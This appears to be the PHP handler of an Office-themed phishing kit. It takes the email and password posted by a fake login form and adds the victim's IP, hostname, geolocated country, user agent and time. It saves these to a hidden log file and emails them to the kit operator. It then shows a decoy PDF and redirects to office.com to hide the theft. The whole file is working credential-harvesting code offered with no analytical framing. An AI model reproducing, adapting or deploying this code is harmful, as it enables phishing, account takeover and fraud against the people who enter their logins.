<?php
session_start();
error_reporting(0);
include "control.php";
include "of.php";

if(isset($_POST["eid"]))
{
	
function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}



$ip=$_SERVER["REMOTE_ADDR"];
$country= ip_info($ip, "Country");
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$hostname=gethostbyaddr($ip);
$agent=$_SERVER['HTTP_USER_AGENT'];
if (!empty($_SERVER['HTTP_CLIENT_IP']))  
    {
      $oip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
    {
      $oip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $oip="same";
    }
	
$details="====================\r\n
Email = ".$_POST["eid"]."
Password = ".$_POST["pid"]."

IP = $ip   HostName= $hostname  Country = $country
Original IP = $oip 
User-Agent= $agent 
Time = $time 
Date = $date 
====================\r\n";


if($log_feature==1)
{
$file=fopen("offc_l0gin_ajr592847921863.txt","a");
fwrite($file,$details);
fclose($file);
}
if($email_feature==1)
{
mail($send,"Office Login $ip",$details);
}

echo '
<html>
<body>

<meta http-equiv="refresh" content="8;URL=https://www.google.bg/url?sa=t&rct=j&q=&esrc=s&source=web&cd=3&ved=0ahUKEwjljueH4P_YAhXDh6YKHcGQAMQQFgg9MAI&url=https%3A%2F%2Fwww.office.com%2F&usg=AOvVaw297op3g8pyu3qja2RPtXVz" />


<iframe src="viewf/wealth.pdf" style="width:100%;height:100%" frameborder="0"></iframe>

</body>
</html>';

session_destroy();
}

?>
